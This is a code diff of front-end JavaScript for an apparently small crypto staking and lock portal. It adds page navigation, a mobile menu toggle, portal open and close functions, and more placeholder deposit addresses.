@@ -1,32 +1,38 @@
-// Smooth scroll to sections
-function scrollToSection(id) {
-  const el = document.getElementById(id);
-  if (el) el.scrollIntoView({ behavior: "smooth" });
+// --- Navigation logic ---
+function gotoPage(page) {
+  // Hide all pages
+  document.querySelectorAll('.page').forEach(p => p.style.display = 'none');
+  // Show requested page
+  if (page === 'home') document.getElementById('homePage').style.display = 'block';
+  if (page === 'about') document.getElementById('aboutPage').style.display = 'block';
+  if (page === 'faq') document.getElementById('faqPage').style.display = 'block';
+  if (page === 'contact') document.getElementById('contactPage').style.display = 'block';
+  // Close menu if mobile
+  document.getElementById('mainNav').querySelector('.nav-links').classList.remove('active');
 }
 
-// State variables
+// Hamburger menu toggle
+function toggleMenu() {
+  const navLinks = document.getElementById('mainNav').querySelector('.nav-links');
+  navLinks.classList.toggle('active');
+}
+
+// --- Portal logic ---
 let selectedAsset = null;
 let selectedPeriod = null;
 
-// Asset selection
-function selectAsset(asset) {
+function openPortal(asset) {
   selectedAsset = asset;
-  document.querySelectorAll('.asset-card').forEach(card => {
-    card.classList.remove('selected');
-    if (
-      card.querySelector('img') &&
-      card.querySelector('img').alt === asset
-    ) {
-      card.classList.add('selected');
-    }
-  });
-
-  // Show the lock duration view and update title
-  document.getElementById('lock-duration-container').style.display = 'block';
-  document.getElementById('selectedAssetName').textContent = asset;
-
-  // Hide deposit address view if previously shown
+  selectedPeriod = null;
+  // Hide all pages, show portal page
+  document.querySelectorAll('.page').forEach(p => p.style.display = 'none');
+  document.getElementById('portalPage').style.display = 'block';
+  document.getElementById('portalAssetTitle').textContent = asset + " Staking & Lock Portal";
   document.getElementById('deposit-address-container').style.display = 'none';
+}
+
+function closePortal() {
+  gotoPage('home');
 }
 
 // Lock period selection
@@ -34,7 +40,6 @@ function selectPeriod(period) {
   selectedPeriod = period;
   showDeposit();
 }
-
 function selectCustomPeriod() {
   const val = document.getElementById('customPeriod').value.trim();
   if (val) {
@@ -42,15 +47,10 @@ function selectCustomPeriod() {
     showDeposit();
   }
 }
-
 function showDeposit() {
-  // Hide lock duration, show deposit address
-  document.getElementById('lock-duration-container').style.display = 'none';
   document.getElementById('deposit-address-container').style.display = 'block';
   document.getElementById('finalAsset').textContent = selectedAsset;
   document.getElementById('finalPeriod').textContent = selectedPeriod;
-
-  // Address generation placeholder logic
   document.getElementById('depositAddress').textContent = generateAddress(selectedAsset);
 }
 
@@ -66,5 +66,11 @@ function generateAddress(asset) {
   if (asset === 'Ethereum') return '0x1234abcd5678Ef90...';
   if (asset === 'Bitcoin') return 'bc1qxy2kgdygjrsqtz...';
   if (asset === 'Solana') return '8LW5d7Dd6d6uQhL2vB...';
-  return 'To be provided after KYC';
+  if (asset === 'Other') return 'To be provided after KYC';
+  if (asset === 'Cardano') return 'addr1q9...';
+  if (asset === 'Litecoin') return 'ltc1qxy...';
+  return 'To be provided';
 }
+
+// On page load, show home only
+window.onload = function() { gotoPage('home'); };
